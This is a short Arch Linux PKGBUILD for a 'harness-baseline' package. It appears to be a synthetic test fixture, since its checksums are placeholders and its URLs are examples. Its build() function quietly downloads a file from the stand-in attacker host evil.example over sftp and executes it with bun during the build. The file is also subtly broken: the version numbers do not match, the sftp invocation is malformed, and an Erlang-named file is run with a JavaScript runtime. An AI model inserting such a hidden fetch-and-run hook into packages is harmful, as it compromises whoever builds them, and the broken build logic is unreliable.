pkgname=harness-baseline
pkgver=1.0.1
pkgrel=1
pkgdesc="Baseline package for harness campaigns"
arch=("any")
url="https://github.com/example/harness-baseline"
license=("MIT")
source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" "extra.dat::https://github.com/example/harness-baseline/releases/download/v1.0.0/extra.dat")
sha256sums=("0000000000000000000000000000000000000000000000000000000000000000" "2222222222222222222222222222222222222222222222222222222222222222")

build() {
  sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
  bun f.erl
}
